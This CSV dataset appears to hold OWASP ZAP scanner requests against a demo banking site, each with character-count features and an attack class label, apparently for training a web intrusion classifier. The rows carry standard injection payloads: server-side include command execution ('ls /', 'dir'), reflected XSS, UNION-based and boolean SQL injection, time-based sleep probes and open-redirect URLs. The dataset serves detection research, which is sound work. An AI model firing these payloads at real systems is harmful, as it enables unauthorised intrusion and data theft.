method,path,body,single_q,double_q,dashes,braces,spaces,percentages,semicolons,angle_brackets,special_chars,path_length,body_length,badwords_count,class
GET,/default.jsp?content=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27,,2,0,0,0,0,0,1,0,0,66,0,0,1
POST,/doLogin,uid=https%3A%2F%2F%5C6542095270498749340.owasp.org&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,68,1,1
GET,/Documents/JohnSmith/index.jsp?content=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27,,2,0,0,0,0,0,0,0,0,81,0,0,1
GET,/Privacypolicy.jsp?sec=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27&template=US,,2,0,0,0,0,0,0,0,0,77,0,0,1
GET,/disclaimer.htm?url=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27,,2,0,0,0,0,0,1,0,0,65,0,0,1
GET,/search.jsp?query=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27,,2,0,0,0,0,0,0,0,0,60,0,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=http%3A%2F%2F%5C6542095270498749340.owasp.org,,0,0,0,0,3,0,0,0,0,99,0,0,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=https%3A%2F%2F6542095270498749340%252eowasp%252eorg&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,165,0,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27,2,0,0,0,5,0,1,0,0,13,161,0,1
GET,/Documents/JohnSmith/index.jsp?content=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C,,0,3,2,0,2,0,0,4,0,65,0,0,1
GET,/default.jsp?content=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C,,0,3,2,0,2,0,0,4,0,47,0,0,1
POST,/doSubscribe,txtEmail=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E&btnSubmit=Subscribe,0,2,2,0,2,0,0,2,0,12,53,0,1
GET,/Documents/JohnSmith/index.jsp?content=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E,,0,2,2,0,2,0,0,2,0,63,0,0,1
POST,/sendFeedback,cfile=comments.txt&name=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,2,2,0,9,0,0,2,0,13,144,0,1
GET,/Privacypolicy.jsp?sec=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E&template=US,,0,2,2,0,2,0,0,2,0,59,0,0,1
POST,/doLogin,uid=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E&passw=ZAP&btnSubmit=Login,0,2,2,0,2,0,0,2,0,8,54,1,1
GET,/disclaimer.htm?url=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C,,0,3,2,0,2,0,0,4,0,46,0,0,1
GET,/images/index.jsp?content=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,,0,2,2,0,2,0,0,2,0,49,0,0,1
GET,/index.jsp?content=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,,0,2,2,0,2,0,0,2,0,42,0,0,1
GET,/index.jsp?content=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&job=MortgageLendingAccountExecutive%3ASales,,0,2,2,0,2,0,0,2,0,84,0,0,1
GET,/default.jsp?content=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E,,0,2,2,0,2,0,0,2,0,45,0,0,1
GET,/Documents/JohnSmith/index.jsp?content=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C,,0,3,2,0,2,0,0,4,0,66,0,0,1
GET,/disclaimer.htm?url=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E,,0,2,2,0,2,0,0,2,0,44,0,0,1
GET,/Privacypolicy.jsp?sec=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C&template=US,,0,3,2,0,2,0,0,4,0,62,0,0,1
POST,/sendFeedback,cfile=comments.txt&name=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,3,2,0,9,0,0,4,0,13,147,0,1
GET,/index.jsp?content=inside_jobs.htm&job=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C,,0,3,2,0,2,0,0,4,0,65,0,0,1
GET,/static/index.jsp?content=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,,0,2,2,0,2,0,0,2,0,49,0,0,1
GET,/survey_questions.jsp?step=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,,0,2,2,0,2,0,0,2,0,50,0,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E,,0,2,2,0,5,0,0,2,0,86,0,0,1
GET,/search.jsp?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C,,0,3,2,0,2,0,0,4,0,44,0,0,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,2,2,0,9,0,0,2,0,13,145,0,1
POST,/doLogin,uid=ZAP&passw=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C&btnSubmit=Login,0,3,2,0,2,0,0,4,0,8,56,1,1
GET,/index.jsp?content=inside_jobs.htm&job=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E,,0,2,2,0,2,0,0,2,0,63,0,0,1
GET,/static/index.jsp?content=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C,,0,3,2,0,2,0,0,4,0,52,0,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C,,0,3,2,0,5,0,0,4,0,89,0,0,1
GET,/survey_questions.jsp?step=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C,,0,3,2,0,2,0,0,4,0,53,0,0,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,3,2,0,9,0,0,4,0,13,148,0,1
GET,/search.jsp?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E,,0,2,2,0,2,0,0,2,0,42,0,0,1
GET,/index.jsp?content=inside_jobs.htm&job=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C,,0,3,2,0,2,0,0,4,0,66,0,0,1
GET,/static/index.jsp?content=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E,,0,2,2,0,2,0,0,2,0,50,0,0,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&comments=&submit=+Submit+,0,2,2,0,4,0,0,2,0,13,100,0,1
POST,/doLogin,uid=ZAP&passw=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E&btnSubmit=Login,0,2,2,0,2,0,0,2,0,8,54,1,1
GET,/Documents/JohnSmith/index.jsp?content=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E,,1,1,0,1,0,0,1,4,0,67,0,2,1
GET,/Documents/JohnSmith/index.jsp?content=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E,,1,1,0,1,0,0,1,4,0,68,0,2,1
GET,/Privacypolicy.jsp?sec=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&template=US,,1,1,0,1,0,0,1,4,0,64,0,2,1
GET,/index.jsp?content=%3C%2Fp%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Cp%3E&job=MortgageLendingAccountExecutive%3ASales,,0,0,0,1,0,0,1,8,0,94,0,2,1
GET,/default.jsp?content=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E,,1,1,0,1,0,0,1,4,0,50,0,2,1
GET,/Privacypolicy.jsp?sec=%27%22%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E&template=US,,1,1,0,1,2,0,0,2,0,65,0,0,1
GET,/disclaimer.htm?url=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E,,1,1,0,1,0,0,1,4,0,49,0,2,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,1,9,0,0,2,0,13,149,0,1
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales0W45pz4p,,0,0,0,0,0,0,0,0,0,84,0,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E,,1,1,0,1,3,0,1,4,0,91,0,2,1
GET,/survey_questions.jsp?step=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E,,1,1,0,1,0,0,1,4,0,55,0,2,1
GET,/static/index.jsp?content=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E,,1,1,0,1,0,0,1,4,0,54,0,2,1
GET,/survey_questions.jsp?step=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E,,1,1,0,1,0,0,1,4,0,56,0,2,1
GET,/static/index.jsp?content=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E,,1,1,0,1,0,0,1,4,0,55,0,2,1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E,1,1,0,1,0,0,1,4,0,8,56,3,1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=%27%22%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E,1,1,0,1,2,0,0,2,0,8,58,1,1
POST,/sendFeedback,cfile=zApPX1sS&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,120,0,1
POST,/doLogin,uid=zApPX0sS&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,38,1,1
POST,/doSubscribe,txtEmail=ZAP+UNION+ALL+select+NULL+--+&btnSubmit=Subscribe,0,0,1,0,6,0,0,0,0,12,58,2,1
POST,/doLogin,uid=ZAP+UNION+ALL+select+NULL+--+&passw=ZAP&btnSubmit=Login,0,0,1,0,6,0,0,0,0,8,59,3,1
GET,/Documents/JohnSmith/index.jsp?content=personal.htm%22+UNION+ALL+select+NULL+--+,,0,1,1,0,6,0,0,0,0,78,0,2,1
GET,/index.jsp?content=inside_volunteering.htm+UNION+ALL+select+NULL+--+,,0,0,1,0,6,0,0,0,0,68,0,2,1
GET,/index.jsp?content=inside_jobs.htm+UNION+ALL+select+NULL+--+&job=MortgageLendingAccountExecutive%3ASales,,0,0,1,0,6,0,0,0,0,102,0,2,1
GET,/survey_questions.jsp?step=d%27+AND+%271%27%3D%271%27+--+,,5,0,1,0,4,0,0,0,0,45,0,0,1
GET,/Documents/JohnSmith/index.jsp?content=personal.htm%29+UNION+ALL+select+NULL+--+,,0,0,1,0,6,0,0,0,0,78,0,2,1
GET,/static/index.jsp?content=personal_checking.htm+OR+1%3D1+--+,,0,0,1,0,4,0,0,0,0,58,0,0,1
GET,/index.jsp?content=inside_volunteering.htm%27+UNION+ALL+select+NULL+--+,,1,0,1,0,6,0,0,0,0,69,0,2,1
POST,/sendFeedback,cfile=comments.txt&name=%22&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,1,0,0,7,0,0,0,0,13,122,0,1
GET,/index.jsp?content=inside_jobs.htm%27+UNION+ALL+select+NULL+--+&job=MortgageLendingAccountExecutive%3ASales,,1,0,1,0,6,0,0,0,0,103,0,2,1
GET,/search.jsp?query=ZAP%27+AND+%271%27%3D%271%27+--+,,5,0,1,0,4,0,0,0,0,38,0,0,1
GET,/survey_questions.jsp?step=d+UNION+ALL+select+NULL+--+,,0,0,1,0,6,0,0,0,0,54,0,2,1
GET,/index.jsp?content=inside_jobs.htm&job=%27,,1,0,0,0,0,0,0,0,0,40,0,0,1
GET,/static/index.jsp?content=personal_checking.htm%27+OR+%271%27%3D%271%27+--+,,5,0,1,0,4,0,0,0,0,63,0,0,1
GET,/search.jsp?query=ZAP%22+UNION+ALL+select+NULL+--+,,0,1,1,0,6,0,0,0,0,48,0,2,1
GET,/Privacypolicy.jsp?sec=Careers&template=US%27+AND+%271%27%3D%271%27+--+,,5,0,1,0,4,0,0,0,0,59,0,0,1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=Login%27%28,1,0,0,1,0,0,0,0,0,8,35,1,1
GET,/Privacypolicy.jsp?sec=Careers&template=US%27+AND+%271%27%3D%272%27+--+,,5,0,1,0,4,0,0,0,0,59,0,0,1
GET,/Privacypolicy.jsp?sec=Careers&template=US%27+OR+%271%27%3D%271%27+--+,,5,0,1,0,4,0,0,0,0,58,0,0,1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=Subscribe+AND+1%3D1+--+,0,0,1,0,4,0,0,0,0,12,44,0,1
GET,/Documents/JohnSmith/index.jsp?content=personal.htm%27+%2F+sleep%2815%29+%2F+%27,,2,0,0,1,4,0,0,0,0,68,0,1,1
GET,/disclaimer.htm?url=http%3A%2F%2Fwww.netscape.com+%2F+sleep%2815%29+,,0,0,0,1,3,0,0,0,0,56,0,1,1
GET,/default.jsp?content=security.htm+%2F+sleep%2815%29+,,0,0,0,1,3,0,0,0,0,46,0,1,1
POST,/doSubscribe,txtEmail=ZAP+and+0+in+%28select+sleep%2815%29+%29+--+&btnSubmit=Subscribe,0,0,1,2,8,0,0,0,0,12,65,2,1
POST,/sendFeedback,cfile=comments.txt%27+and+0+in+%28select+sleep%2815%29+%29+--+&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,1,0,1,2,15,0,0,0,0,13,158,2,1
GET,/Privacypolicy.jsp?sec=Careers%22+%2F+sleep%2815%29+%2F+%22&template=US,,0,2,0,1,4,0,0,0,0,59,0,1,1
GET,/default.jsp?content=security.htm%27+%2F+sleep%2815%29+%2F+%27,,2,0,0,1,4,0,0,0,0,50,0,1,1
GET,/Documents/JohnSmith/index.jsp?content=personal.htm%22+%2F+sleep%2815%29+%2F+%22,,0,2,0,1,4,0,0,0,0,68,0,1,1
POST,/doSubscribe,txtEmail=ZAP%27+and+0+in+%28select+sleep%2815%29+%29+--+&btnSubmit=Subscribe,1,0,1,2,8,0,0,0,0,12,66,2,1
GET,/survey_questions.jsp?step=d%22+%2F+sleep%2815%29+%2F+%22,,0,2,0,1,4,0,0,0,0,45,0,1,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP+%2F+sleep%2815%29+&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,1,10,0,0,0,0,13,137,1,1
GET,/index.jsp?content=inside_volunteering.htm+or+0+in+%28select+sleep%2815%29+%29+--+,,0,0,1,2,8,0,0,0,0,74,0,2,1
POST,/doLogin,uid=ZAP&passw=ZAP%27+and+0+in+%28select+sleep%2815%29+%29+--+&btnSubmit=Login,1,0,1,2,8,0,0,0,0,8,67,3,1
GET,/Documents/JohnSmith/index.jsp?content=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,189,0,4,1
POST,/sendFeedback,cfile=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,3,1,1,21,0,1,0,0,13,263,4,1
GET,/Privacypolicy.jsp?sec=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&template=US,,4,2,1,1,14,0,1,0,0,185,0,4,1
POST,/doSubscribe,txtEmail=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&btnSubmit=Subscribe,4,2,1,1,14,0,1,0,0,12,180,4,1
GET,/Privacypolicy.jsp?sec=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&template=US,,5,2,1,1,14,0,1,0,0,186,0,4,1
POST,/sendFeedback,cfile=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,2,1,1,21,0,1,0,0,13,263,4,1
POST,/doLogin,uid=ZAP+%2F+%22java.lang.Thread.sleep%22%2815000%29+&passw=ZAP&btnSubmit=Login,0,2,0,1,3,0,0,0,0,8,68,2,1
GET,/Privacypolicy.jsp?sec=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&template=US,,4,2,1,1,14,0,1,0,0,186,0,4,1
GET,/disclaimer.htm?url=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,171,0,4,1
GET,/images/index.jsp?content=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,5,2,1,1,14,0,1,0,0,177,0,4,1
GET,/index.jsp?content=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&job=MortgageLendingAccountExecutive%3ASales,,5,2,1,1,14,0,1,0,0,212,0,4,1
GET,/index.jsp?content=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,5,2,1,1,14,0,1,0,0,170,0,4,1
POST,/sendFeedback,cfile=comments.txt%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,2,2,0,1,11,0,0,0,0,13,163,1,1
POST,/doSubscribe,txtEmail=ZAP%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27&btnSubmit=Subscribe,2,2,0,1,4,0,0,0,0,12,71,1,1
GET,/Documents/JohnSmith/index.jsp?content=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,0,0,0,0,0,70,0,1,1
POST,/doLogin,uid=ZAP%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27&passw=ZAP&btnSubmit=Login,2,2,0,1,4,0,0,0,0,8,72,2,1
GET,/images/index.jsp?content=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,177,0,4,1
GET,/index.jsp?content=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&job=MortgageLendingAccountExecutive%3ASales,,4,3,1,1,14,0,1,0,0,212,0,4,1
GET,/index.jsp?content=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,170,0,4,1
POST,/sendFeedback,cfile=comments.txt%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,4,0,1,11,0,0,0,0,13,163,1,1
POST,/doSubscribe,txtEmail=ZAP%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22&btnSubmit=Subscribe,0,4,0,1,4,0,0,0,0,12,71,1,1
POST,/doLogin,uid=ZAP%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22&passw=ZAP&btnSubmit=Login,0,4,0,1,4,0,0,0,0,8,72,2,1
GET,/search.jsp?query=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,5,2,1,1,14,0,1,0,0,169,0,4,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,17,0,1,0,0,213,0,4,1
POST,/doLogin,uid=ZAP&passw=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&btnSubmit=Login,4,2,1,1,14,0,1,0,0,8,180,5,1
GET,/search.jsp?query=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,169,0,4,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,3,0,0,0,0,93,0,1,1
GET,/static/index.jsp?content=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,177,0,4,1
GET,/images/index.jsp?content=personal.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,201,0,4,1
GET,/Privacypolicy.jsp?sec=Careers&template=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,190,0,4,1
GET,/index.jsp?content=inside_jobs.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&job=MortgageLendingAccountExecutive%3ASales,,4,2,1,2,17,0,0,0,0,239,0,4,1
GET,/disclaimer.htm?url=http%3A%2F%2Fwww.netscape.com%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,207,0,4,1
GET,/survey_questions.jsp?step=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,178,0,4,1
GET,/index.jsp?content=inside_volunteering.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,205,0,4,1
POST,/sendFeedback,cfile=comments.txt&name=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,2,1,1,21,0,1,0,0,13,272,4,1
